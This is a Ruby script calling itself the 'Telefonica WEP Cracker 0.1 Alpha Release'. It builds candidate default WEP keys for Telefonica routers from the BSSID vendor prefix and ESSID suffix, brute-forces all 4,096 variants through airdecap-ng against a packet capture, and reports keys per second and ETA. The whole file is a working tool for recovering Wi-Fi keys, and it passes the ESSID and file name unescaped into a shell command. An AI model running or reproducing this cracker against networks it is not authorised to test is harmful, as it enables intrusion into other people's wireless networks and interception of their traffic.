def get_letter_from(number)
  case number
  when /^001349/
    return "Z"
  when /^0030DA/
    return "C"
  when /^000138/
    return "X"
  else
    return "N"
  end
end


def sec2hms(secs)
  time = secs.round
  sec = time % 60.to_i
  time /= 60
  mins = time % 60
  time /= 60
  hrs = time % 24
  [hrs,mins,sec]
end

bssid = ''
essid = ''
file = ''

ARGV.each_with_index do |arg, num|
  case arg
  when '-b'
    bssid = ARGV[num+1]
  when '-e'
    essid = ARGV[num+1]
  when '-f'
    file = ARGV[num+1]
  end
end

start = bssid.gsub(':','')[0..6].upcase
puts start.inspect
letter = get_letter_from(start)
ending = essid.split('_').last.upcase

number_options = []

16.times do |f|
  16.times do |s|
    16.times do |t|
      number_options << [f.to_s(16),s.to_s(16),t.to_s(16)]
    end
  end
end

options = []

number_options.each do |n|
  options << "#{letter}#{start}#{n.join.upcase}#{ending}"
end

rate = 0
eta = 0
counter = 0
starting_at = Time.now
len = options.length
options.shuffle.each do |option|
  a = `airdecap-ng -w #{option.unpack('H*')} #{file} -e #{essid}`
  if a.match(/\nNumber of decrypted WEP  packets[\s]+[^0]+\n/) then
    puts a
    puts "Decrypted packet with key #{option} !"
    exit(0)
  end
  counter += 1
  rate = (counter / (Time.now - starting_at).to_f).to_i
  eta = sec2hms((len - counter) / rate.to_f)
  elapsed = sec2hms(Time.now.sec - starting_at.sec.to_f)
  showable_eta = "#{eta[0]} hours, #{eta[1]} minutes and #{eta[2]} seconds"
  showable_elapsed = "#{elapsed[0]} hours, #{elapsed[1]} minutes and #{elapsed[2]} seconds"
  system("clear")
  puts "Telefonica WEP Cracker 0.1 Alpha Release"
  puts "Tried #{counter} keys... out of #{len}"
  puts "#{rate} keys/sec | ETA: #{showable_eta} | Elapsed: #{showable_elapsed}"
end

